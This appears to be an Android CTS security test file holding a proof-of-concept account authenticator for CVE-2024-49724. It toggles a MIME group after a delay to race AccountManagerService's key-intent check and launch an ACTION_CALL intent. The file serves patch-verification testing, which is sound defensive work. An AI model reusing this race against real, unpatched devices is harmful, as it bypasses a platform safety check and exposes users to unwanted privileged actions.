/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_49724;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.util.Collections;
import java.util.HashSet;

public class AccountService extends Service {
    private static int sRequiredDelay = 5;

    public AccountService() {}

    @Override
    public IBinder onBind(Intent intent) {
        return new PocAccountAuthenticator(this).getIBinder();
    }

    private static class PocAccountAuthenticator extends AbstractAccountAuthenticator {
        private Context mContext;

        PocAccountAuthenticator(Context context) {
            super(context);
            mContext = context;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return Bundle.EMPTY;
        }

        @Override
        public Bundle addAccount(
                AccountAuthenticatorResponse response,
                String accountType,
                String authTokenType,
                String[] requiredFeatures,
                Bundle options) {
            try {
                // Set the MIME group to an empty set to ensure that PocPlaceholderActivity
                // satisfies the key intent at the time of check in
                // AccountManagerService#checkKeyIntent()
                final String mimeGroup = "cve_2024_49724_mimeGroup";
                mContext.getPackageManager().setMimeGroup(mimeGroup, new HashSet<>());

                new Handler(Looper.getMainLooper())
                        .postDelayed(
                                new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            // Update the MIME group after a delay to ensure that
                                            // PocPlaceholderActivity no longer satisfies the key
                                            // intent at the time of launch
                                            mContext.getPackageManager()
                                                    .setMimeGroup(
                                                            mimeGroup,
                                                            Collections.singleton(
                                                                    "cve_2024_49724/mime"));
                                            sRequiredDelay += 5;
                                        } catch (Exception e) {
                                            // Ignore unintended exceptions
                                        }
                                    }
                                },
                                sRequiredDelay);

                Bundle result = new Bundle();
                result.putParcelable(
                        AccountManager.KEY_INTENT,
                        new Intent(Intent.ACTION_CALL)
                                .setData(Uri.parse(mContext.getString(R.string.dataUri)))
                                .addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION));
                return result;
            } catch (Exception e) {
                // Ignore unintended exceptions
            }
            return null;
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options)
                throws NetworkErrorException {
            return Bundle.EMPTY;
        }

        @Override
        public Bundle getAuthToken(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return Bundle.EMPTY;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return Bundle.EMPTY;
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features)
                throws NetworkErrorException {
            return Bundle.EMPTY;
        }
    }
}
